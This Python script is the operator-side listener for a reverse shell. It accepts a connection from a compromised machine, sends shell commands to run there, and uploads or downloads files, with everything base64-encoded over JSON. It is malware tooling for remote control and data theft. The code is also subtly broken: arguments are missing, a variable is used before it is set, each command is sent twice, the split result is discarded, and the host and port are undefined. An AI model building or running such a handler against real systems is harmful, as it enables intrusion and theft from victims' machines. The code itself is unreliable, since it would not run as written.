#!/usr/bin/python 
import socket, json, base64, shlex

class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from "+ str(address))
    
    def json_send(self, data):
        json_data = json.dumps()
        self.connection.send(json_data.encode())
    
    def json_receive(self, data):
     json_data = b""
     while True:
        try:
            json_data = json_data + self.connection.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue
    def exec_remote(self, command):
        self.json_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        self.json_send(command)
        return self.json_receive()
    
    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."
    
    def read_file(self, path):
        with open(path, 'rb') as file:
           return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command.split(" ")
      # try:
            if command[0] == "upload" and "[-] Error " not in result:
               file_content = self.read_file(command[1]).decode()
               command.append(file_content)
           
            result = self.exec_remote(command)
       
            if command[0] == "download" and "[-] Error " not in result:
               self.write_file(command[1], result)
     #  except Exception:
               result = "[-] Error "
            print(result)

    


my_listener = Listener(ip, port)
my_listener.run()
